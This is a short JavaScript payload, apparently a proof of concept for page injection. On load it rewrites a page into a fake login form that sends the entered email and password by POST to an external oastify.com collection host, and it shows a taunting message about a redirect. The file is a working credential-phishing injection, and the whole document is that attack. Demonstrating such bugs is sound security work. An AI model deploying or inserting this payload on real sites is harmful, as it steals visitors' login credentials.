document.addEventListener("DOMContentLoaded", function() {
    
    const title = document.createElement('title');
    title.textContent = 'Not a Fake Webpage';

    document.body.innerHTML = `
        <div class="container">
            <div class="left">
                <h1>Login Form</h1>
                <form action="https://pg9skevlq4m7jhc5cl5a81kf86ex2rqg.oastify.com" method="POST">
                    <label>Email: </label>
                    <input type="email" name="email" required>
                    <label>Password: </label>
                    <input type="password" name="password" required>
                    <button type="submit">Submit</button>
                </form>
            </div>
            <div class="right">
                <h1>Hello visitor!</h1>
                <p>You just got redirected :)<br>Hope you did not input anything sensitive ;)</p>
                <img src="https://media.tenor.com/EFDwfjT2GuQAAAAM/spinning-cat.gif" alt="Spinning Cat">
            </div>
        </div>
    `;

    document.head.appendChild(title);
});
